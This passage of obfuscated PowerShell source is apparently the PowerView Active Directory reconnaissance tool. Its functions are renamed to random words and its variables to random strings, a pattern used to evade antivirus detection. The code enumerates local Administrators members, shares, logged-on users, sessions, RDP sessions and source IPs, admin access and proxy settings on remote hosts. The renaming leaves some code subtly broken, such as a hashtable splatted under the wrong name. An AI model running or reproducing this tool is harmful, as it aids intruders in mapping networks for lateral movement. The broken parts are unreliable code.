    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = $Env:COMPUTERNAME,
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $vKlpkKQd99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            if ($vKlpkKQd99 -eq 'API') {
                $WhuAwLkA99 = 1
                $HOChRdeK99 = [IntPtr]::Zero
                $qkmlQHCv99 = 0
                $mjIqFsvT99 = 0
                $wnsYnMuh99 = 0
                $rKtGlbHQ99 = $CBPFTmxs99::NetLocalGroupEnum($YaYHUvEO99, $WhuAwLkA99, [ref]$HOChRdeK99, -1, [ref]$qkmlQHCv99, [ref]$mjIqFsvT99, [ref]$wnsYnMuh99)
                $LIdFeKYN99 = $HOChRdeK99.ToInt64()
                if (($rKtGlbHQ99 -eq 0) -and ($LIdFeKYN99 -gt 0)) {
                    $vkFCmlnO99 = $obwoAMbm99::GetSize()
                    for ($i = 0; ($i -lt $qkmlQHCv99); $i++) {
                        $bglqjtHZ99 = New-Object System.Intptr -ArgumentList $LIdFeKYN99
                        $Info = $bglqjtHZ99 -as $obwoAMbm99
                        $LIdFeKYN99 = $bglqjtHZ99.ToInt64()
                        $LIdFeKYN99 += $vkFCmlnO99
                        $FGbmqQBB99 = New-Object PSObject
                        $FGbmqQBB99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                        $FGbmqQBB99 | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $FGbmqQBB99 | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $FGbmqQBB99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $FGbmqQBB99
                    }
                    $Null = $CBPFTmxs99::NetApiBufferFree($HOChRdeK99)
                }
                else {
                    Write-Verbose "[bucksaws] Error: $(([ComponentModel.Win32Exception] $rKtGlbHQ99).Message)"
                }
            }
            else {
                $Qjmasfjd99 = [ADSI]"WinNT://$YaYHUvEO99,computer"
                $Qjmasfjd99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $FGbmqQBB99 = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                    $Group | Add-Member Noteproperty 'GroupName' ($FGbmqQBB99.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($FGbmqQBB99.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($FGbmqQBB99.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function precipitated {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = $Env:COMPUTERNAME,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $nrOpsRrf99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $vKlpkKQd99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            if ($vKlpkKQd99 -eq 'API') {
                $WhuAwLkA99 = 2
                $HOChRdeK99 = [IntPtr]::Zero
                $qkmlQHCv99 = 0
                $mjIqFsvT99 = 0
                $wnsYnMuh99 = 0
                $rKtGlbHQ99 = $CBPFTmxs99::NetLocalGroupGetMembers($YaYHUvEO99, $nrOpsRrf99, $WhuAwLkA99, [ref]$HOChRdeK99, -1, [ref]$qkmlQHCv99, [ref]$mjIqFsvT99, [ref]$wnsYnMuh99)
                $LIdFeKYN99 = $HOChRdeK99.ToInt64()
                $BznuurjO99 = @()
                if (($rKtGlbHQ99 -eq 0) -and ($LIdFeKYN99 -gt 0)) {
                    $vkFCmlnO99 = $rvNRlxzE99::GetSize()
                    for ($i = 0; ($i -lt $qkmlQHCv99); $i++) {
                        $bglqjtHZ99 = New-Object System.Intptr -ArgumentList $LIdFeKYN99
                        $Info = $bglqjtHZ99 -as $rvNRlxzE99
                        $LIdFeKYN99 = $bglqjtHZ99.ToInt64()
                        $LIdFeKYN99 += $vkFCmlnO99
                        $BqvbElhB99 = ''
                        $wYAdxZXM99 = $kLxjtaqc99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$BqvbElhB99);$ZIbFJfXa99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($wYAdxZXM99 -eq 0) {
                            Write-Verbose "[precipitated] Error: $(([ComponentModel.Win32Exception] $ZIbFJfXa99).Message)"
                        }
                        else {
                            $RLVMFVRY99 = New-Object PSObject
                            $RLVMFVRY99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                            $RLVMFVRY99 | Add-Member Noteproperty 'GroupName' $nrOpsRrf99
                            $RLVMFVRY99 | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $RLVMFVRY99 | Add-Member Noteproperty 'SID' $BqvbElhB99
                            $INJqvJJU99 = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $RLVMFVRY99 | Add-Member Noteproperty 'IsGroup' $INJqvJJU99
                            $RLVMFVRY99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $BznuurjO99 += $RLVMFVRY99
                        }
                    }
                    $Null = $CBPFTmxs99::NetApiBufferFree($HOChRdeK99)
                    $fJCsCbIk99 = $BznuurjO99 | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($fJCsCbIk99) {
                        $fJCsCbIk99 = $fJCsCbIk99.Substring(0, $fJCsCbIk99.LastIndexOf('-'))
                        $BznuurjO99 | ForEach-Object {
                            if ($_.SID -match $fJCsCbIk99) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $BznuurjO99 | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $BznuurjO99
                }
                else {
                    Write-Verbose "[precipitated] Error: $(([ComponentModel.Win32Exception] $rKtGlbHQ99).Message)"
                }
            }
            else {
                try {
                    $WbZPAhAt99 = [ADSI]"WinNT://$YaYHUvEO99/$nrOpsRrf99,group"
                    $WbZPAhAt99.psbase.Invoke('Members') | ForEach-Object {
                        $RLVMFVRY99 = New-Object PSObject
                        $RLVMFVRY99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                        $RLVMFVRY99 | Add-Member Noteproperty 'GroupName' $nrOpsRrf99
                        $lndfKLdb99 = ([ADSI]$_)
                        $gLeyDlWc99 = $lndfKLdb99.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $INJqvJJU99 = ($lndfKLdb99.SchemaClassName -like 'group')
                        if(([regex]::Matches($gLeyDlWc99, '/')).count -eq 1) {
                            $qupqnfae99 = $True
                            $Name = $gLeyDlWc99.Replace('/', '\')
                        }
                        else {
                            $qupqnfae99 = $False
                            $Name = $gLeyDlWc99.Substring($gLeyDlWc99.IndexOf('/')+1).Replace('/', '\')
                        }
                        $RLVMFVRY99 | Add-Member Noteproperty 'AccountName' $Name
                        $RLVMFVRY99 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($lndfKLdb99.InvokeGet('ObjectSID'),0)).Value)
                        $RLVMFVRY99 | Add-Member Noteproperty 'IsGroup' $INJqvJJU99
                        $RLVMFVRY99 | Add-Member Noteproperty 'IsDomain' $qupqnfae99
                        $RLVMFVRY99
                    }
                }
                catch {
                    Write-Verbose "[precipitated] Error for $YaYHUvEO99 : $_"
                }
            }
        }
    }
    
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function ridiculous {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            $WhuAwLkA99 = 1
            $HOChRdeK99 = [IntPtr]::Zero
            $qkmlQHCv99 = 0
            $mjIqFsvT99 = 0
            $wnsYnMuh99 = 0
            $rKtGlbHQ99 = $CBPFTmxs99::NetShareEnum($YaYHUvEO99, $WhuAwLkA99, [ref]$HOChRdeK99, -1, [ref]$qkmlQHCv99, [ref]$mjIqFsvT99, [ref]$wnsYnMuh99)
            $LIdFeKYN99 = $HOChRdeK99.ToInt64()
            if (($rKtGlbHQ99 -eq 0) -and ($LIdFeKYN99 -gt 0)) {
                $vkFCmlnO99 = $tQSzneeQ99::GetSize()
                for ($i = 0; ($i -lt $qkmlQHCv99); $i++) {
                    $bglqjtHZ99 = New-Object System.Intptr -ArgumentList $LIdFeKYN99
                    $Info = $bglqjtHZ99 -as $tQSzneeQ99
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $LIdFeKYN99 = $bglqjtHZ99.ToInt64()
                    $LIdFeKYN99 += $vkFCmlnO99
                    $Share
                }
                $Null = $CBPFTmxs99::NetApiBufferFree($HOChRdeK99)
            }
            else {
                Write-Verbose "[ridiculous] Error: $(([ComponentModel.Win32Exception] $rKtGlbHQ99).Message)"
            }
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function Erna {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            $WhuAwLkA99 = 1
            $HOChRdeK99 = [IntPtr]::Zero
            $qkmlQHCv99 = 0
            $mjIqFsvT99 = 0
            $wnsYnMuh99 = 0
            $rKtGlbHQ99 = $CBPFTmxs99::NetWkstaUserEnum($YaYHUvEO99, $WhuAwLkA99, [ref]$HOChRdeK99, -1, [ref]$qkmlQHCv99, [ref]$mjIqFsvT99, [ref]$wnsYnMuh99)
            $LIdFeKYN99 = $HOChRdeK99.ToInt64()
            if (($rKtGlbHQ99 -eq 0) -and ($LIdFeKYN99 -gt 0)) {
                $vkFCmlnO99 = $NlJPyjwf99::GetSize()
                for ($i = 0; ($i -lt $qkmlQHCv99); $i++) {
                    $bglqjtHZ99 = New-Object System.Intptr -ArgumentList $LIdFeKYN99
                    $Info = $bglqjtHZ99 -as $NlJPyjwf99
                    $RjSTVObl99 = $Info | Select-Object *
                    $RjSTVObl99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                    $RjSTVObl99.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $LIdFeKYN99 = $bglqjtHZ99.ToInt64()
                    $LIdFeKYN99 += $vkFCmlnO99
                    $RjSTVObl99
                }
                $Null = $CBPFTmxs99::NetApiBufferFree($HOChRdeK99)
            }
            else {
                Write-Verbose "[Erna] Error: $(([ComponentModel.Win32Exception] $rKtGlbHQ99).Message)"
            }
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function Scotty {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            $WhuAwLkA99 = 10
            $HOChRdeK99 = [IntPtr]::Zero
            $qkmlQHCv99 = 0
            $mjIqFsvT99 = 0
            $wnsYnMuh99 = 0
            $rKtGlbHQ99 = $CBPFTmxs99::NetSessionEnum($YaYHUvEO99, '', $XOIvwKgj99, $WhuAwLkA99, [ref]$HOChRdeK99, -1, [ref]$qkmlQHCv99, [ref]$mjIqFsvT99, [ref]$wnsYnMuh99)
            $LIdFeKYN99 = $HOChRdeK99.ToInt64()
            if (($rKtGlbHQ99 -eq 0) -and ($LIdFeKYN99 -gt 0)) {
                $vkFCmlnO99 = $shbhirre99::GetSize()
                for ($i = 0; ($i -lt $qkmlQHCv99); $i++) {
                    $bglqjtHZ99 = New-Object System.Intptr -ArgumentList $LIdFeKYN99
                    $Info = $bglqjtHZ99 -as $shbhirre99
                    $qeIiTgYf99 = $Info | Select-Object *
                    $qeIiTgYf99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                    $qeIiTgYf99.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $LIdFeKYN99 = $bglqjtHZ99.ToInt64()
                    $LIdFeKYN99 += $vkFCmlnO99
                    $qeIiTgYf99
                }
                $Null = $CBPFTmxs99::NetApiBufferFree($HOChRdeK99)
            }
            else {
                Write-Verbose "[Scotty] Error: $(([ComponentModel.Win32Exception] $rKtGlbHQ99).Message)"
            }
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function midges {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$BoyAErDp99")
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $XOIvwKgj99 = chews -ObjectSID $_ -ffAeRAxr99 'DomainSimple'
                    if ($XOIvwKgj99) {
                        $XOIvwKgj99, $GOrSdVAL99 = $XOIvwKgj99.Split('@')
                    }
                    else {
                        $XOIvwKgj99 = $_
                        $GOrSdVAL99 = $Null
                    }
                    $scqjhYxF99 = New-Object PSObject
                    $scqjhYxF99 | Add-Member Noteproperty 'ComputerName' "$BoyAErDp99"
                    $scqjhYxF99 | Add-Member Noteproperty 'UserDomain' $GOrSdVAL99
                    $scqjhYxF99 | Add-Member Noteproperty 'UserName' $XOIvwKgj99
                    $scqjhYxF99 | Add-Member Noteproperty 'UserSID' $_
                    $scqjhYxF99.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $scqjhYxF99
                }
            }
            catch {
                Write-Verbose "[midges] Error opening remote registry on '$BoyAErDp99' : $_"
            }
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function Odom {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            $TVdCyUgr99 = $Slnejkwp99::WTSOpenServerEx($YaYHUvEO99)
            if ($TVdCyUgr99 -ne 0) {
                $pTSmloEy99 = [IntPtr]::Zero
                $Vrqnpguq99 = 0
                $rKtGlbHQ99 = $Slnejkwp99::WTSEnumerateSessionsEx($TVdCyUgr99, [ref]1, 0, [ref]$pTSmloEy99, [ref]$Vrqnpguq99);$ZIbFJfXa99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $LIdFeKYN99 = $pTSmloEy99.ToInt64()
                if (($rKtGlbHQ99 -ne 0) -and ($LIdFeKYN99 -gt 0)) {
                    $vkFCmlnO99 = $MqEpWIAA99::GetSize()
                    for ($i = 0; ($i -lt $Vrqnpguq99); $i++) {
                        $bglqjtHZ99 = New-Object System.Intptr -ArgumentList $LIdFeKYN99
                        $Info = $bglqjtHZ99 -as $MqEpWIAA99
                        $wucZVTtd99 = New-Object PSObject
                        if ($Info.pHostName) {
                            $wucZVTtd99 | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            $wucZVTtd99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                        }
                        $wucZVTtd99 | Add-Member Noteproperty 'SessionName' $Info.pSessionName
                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $wucZVTtd99 | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $wucZVTtd99 | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }
                        $wucZVTtd99 | Add-Member Noteproperty 'ID' $Info.SessionID
                        $wucZVTtd99 | Add-Member Noteproperty 'State' $Info.State
                        $doaIkxOz99 = [IntPtr]::Zero
                        $uYmeqLlE99 = 0
                        $wYAdxZXM99 = $Slnejkwp99::WTSQuerySessionInformation($TVdCyUgr99, $Info.SessionID, 14, [ref]$doaIkxOz99, [ref]$uYmeqLlE99);$XznnOTRI99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($wYAdxZXM99 -eq 0) {
                            Write-Verbose "[Odom] Error: $(([ComponentModel.Win32Exception] $XznnOTRI99).Message)"
                        }
                        else {
                            $wvhPaViK99 = $doaIkxOz99.ToInt64()
                            $GBxaobvX99 = New-Object System.Intptr -ArgumentList $wvhPaViK99
                            $Info2 = $GBxaobvX99 -as $MLeUUkBc99
                            $GrdwEBcx99 = $Info2.Address
                            if ($GrdwEBcx99[2] -ne 0) {
                                $GrdwEBcx99 = [String]$GrdwEBcx99[2]+'.'+[String]$GrdwEBcx99[3]+'.'+[String]$GrdwEBcx99[4]+'.'+[String]$GrdwEBcx99[5]
                            }
                            else {
                                $GrdwEBcx99 = $Null
                            }
                            $wucZVTtd99 | Add-Member Noteproperty 'SourceIP' $GrdwEBcx99
                            $wucZVTtd99.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $wucZVTtd99
                            $Null = $Slnejkwp99::WTSFreeMemory($doaIkxOz99)
                            $LIdFeKYN99 += $vkFCmlnO99
                        }
                    }
                    $Null = $Slnejkwp99::WTSFreeMemoryEx(2, $pTSmloEy99, $Vrqnpguq99)
                }
                else {
                    Write-Verbose "[Odom] Error: $(([ComponentModel.Win32Exception] $ZIbFJfXa99).Message)"
                }
                $Null = $Slnejkwp99::WTSCloseServer($TVdCyUgr99)
            }
            else {
                Write-Verbose "[Odom] Error opening the Remote Desktop Session Host (RD Session Host) server for: $BoyAErDp99"
            }
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function runarounds {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            $TVdCyUgr99 = $kLxjtaqc99::OpenSCManagerW("\\$YaYHUvEO99", 'ServicesActive', 0xF003F);$ZIbFJfXa99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $uJbJWwql99 = New-Object PSObject
            $uJbJWwql99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
            if ($TVdCyUgr99 -ne 0) {
                $Null = $kLxjtaqc99::CloseServiceHandle($TVdCyUgr99)
                $uJbJWwql99 | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[runarounds] Error: $(([ComponentModel.Win32Exception] $ZIbFJfXa99).Message)"
                $uJbJWwql99 | Add-Member Noteproperty 'IsAdmin' $False
            }
            $uJbJWwql99.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $uJbJWwql99
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function benevolences {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            if ($YaYHUvEO99 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $PkMJVkaY99 = $YaYHUvEO99
                $YaYHUvEO99 = [System.Net.Dns]::GetHostByAddress($YaYHUvEO99) | Select-Object -ExpandProperty HostName
            }
            else {
                $PkMJVkaY99 = @(Mg -BoyAErDp99 $YaYHUvEO99)[0].IPAddress
            }
            $HOChRdeK99 = [IntPtr]::Zero
            $rKtGlbHQ99 = $CBPFTmxs99::DsGetSiteName($YaYHUvEO99, [ref]$HOChRdeK99)
            $EtwRUEzf99 = New-Object PSObject
            $EtwRUEzf99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
            $EtwRUEzf99 | Add-Member Noteproperty 'IPAddress' $PkMJVkaY99
            if ($rKtGlbHQ99 -eq 0) {
                $AxVRNJsI99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($HOChRdeK99)
                $EtwRUEzf99 | Add-Member Noteproperty 'SiteName' $AxVRNJsI99
            }
            else {
                Write-Verbose "[benevolences] Error: $(([ComponentModel.Win32Exception] $rKtGlbHQ99).Message)"
                $EtwRUEzf99 | Add-Member Noteproperty 'SiteName' ''
            }
            $EtwRUEzf99.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
            $Null = $CBPFTmxs99::NetApiBufferFree($HOChRdeK99)
            $EtwRUEzf99
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function syllogism {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = $Env:COMPUTERNAME,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            try {
                $oeuhoiCr99 = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $YaYHUvEO99
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $oeuhoiCr99['Credential'] = $DegNROrc99 }
                $HUdOHFLj99 = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'
                $HKCU = 2147483649
                $JPZCzIMI99 = $HUdOHFLj99.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $CPKUDWJj99 = $HUdOHFLj99.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
                $Wpad = ''
                if ($CPKUDWJj99 -and ($CPKUDWJj99 -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($CPKUDWJj99)
                    }
                    catch {
                        Write-Warning "[syllogism] Error connecting to AutoConfigURL : $CPKUDWJj99"
                    }
                }
                if ($JPZCzIMI99 -or $CPKUDWJj99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                    $Out | Add-Member Noteproperty 'ProxyServer' $JPZCzIMI99
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $CPKUDWJj99
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[syllogism] No proxy settings found for $BoyAErDp99"
                }
            }
            catch {
                Write-Warning "[syllogism] Error enumerating proxy settings for $BoyAErDp99 : $_"
            }
        }
    }
}
function sorrowing {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            $HKLM = 2147483650
            $oeuhoiCr99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $YaYHUvEO99
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $oeuhoiCr99['Credential'] = $DegNROrc99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $WHcnvyKe99 = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
                $YaBBGMxM99 = New-Object PSObject
                $YaBBGMxM99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                $YaBBGMxM99 | Add-Member Noteproperty 'LastLoggedOn' $WHcnvyKe99
                $YaBBGMxM99.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $YaBBGMxM99
            }
            catch {
                Write-Warning "[sorrowing] Error opening remote registry on $YaYHUvEO99. Remote registry likely not enabled."
            }
        }
    }
}
function mousers {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
